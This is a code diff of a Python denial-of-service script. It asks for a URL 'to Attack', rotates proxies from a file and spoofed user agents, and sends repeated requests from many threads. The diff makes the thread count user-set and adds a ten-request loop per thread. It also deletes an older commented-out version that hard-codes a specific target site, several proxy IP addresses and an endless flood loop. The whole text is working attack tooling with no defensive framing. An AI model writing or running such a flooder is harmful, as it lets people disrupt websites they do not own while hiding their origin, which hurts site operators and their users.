@@ -17,10 +17,10 @@ def random_user_agent():
     return headers
 
 url=input("Enter the URL you want to Attack:")
-# Thread =int(input("Enter the No: of Threads:"))
+Thread =int(input("Enter the No: of Threads:"))
 # url = "http://ipinfo.io/json"
 # url = "https://centinels.zeal.ninja/"
-Thread = 1024
+# Thread = 1024
 valied_proxy=[]
 
 with open("ValidProxy.txt","r") as f:
@@ -28,18 +28,19 @@ with open("ValidProxy.txt","r") as f:
 
 def send_req(url):
 
-    int = random.randint(0,len(valied_proxy) -1)
-    proxy = {
-    'http': valied_proxy[int],
-    'https': valied_proxy[int]
-}
+  for _ in range(10):
+        int = random.randint(0,len(valied_proxy) -1)
+        proxy = {
+        'http': valied_proxy[int],
+        'https': valied_proxy[int]
+        }
      
-    try:
-    #  print(proxy)
-     res = requests.get(url, headers=random_user_agent(),proxies=proxy)
-    #  print(res.json())
-    except Exception as e:
-        print(f"Error making request to {url}: {e}")  
+        try:
+            # print(proxy)
+            res = requests.get(url, headers=random_user_agent(),proxies=proxy)
+            print(res.json())
+        except Exception as e:
+            print(f"Error making request to {url}: {e}")  
 
 
 threads =[]
@@ -61,41 +62,3 @@ for thread in threads:
 
 
 
-
-
-# List of proxies
-# proxies = [
-#     'https://36.93.68.47:41890',
-#     'https://186.3.91.110:999',
-#     'https://113.160.37.152:53281',
-#     'https://190.97.236.40:2023',
-#     # Add more proxies as needed
-# ]
-#
-# # Target URL
-# target = 'https://centinels.zeal.ninja/'
-#
-# def send_request():
-#     # Select a random proxy
-#     proxy = random.choice(proxies)
-#     try:
-#         # Send a request using the proxy
-#         requests.get(target, proxies={'https': proxy, 'https': proxy})
-#     except:
-#         pass
-#
-# # Get the number of threads from the user
-# num_threads = int(input('Enter the number of threads: '))
-#
-# # Loop indefinitely
-# while True:
-#     # Create and start threads
-#     threads = []
-#     for _ in range(num_threads):
-#         t = threading.Thread(target=send_request)
-#         t.start()
-#         threads.append(t)
-#
-#     # Wait for all threads to finish
-#     for t in threads:
-#         t.join()
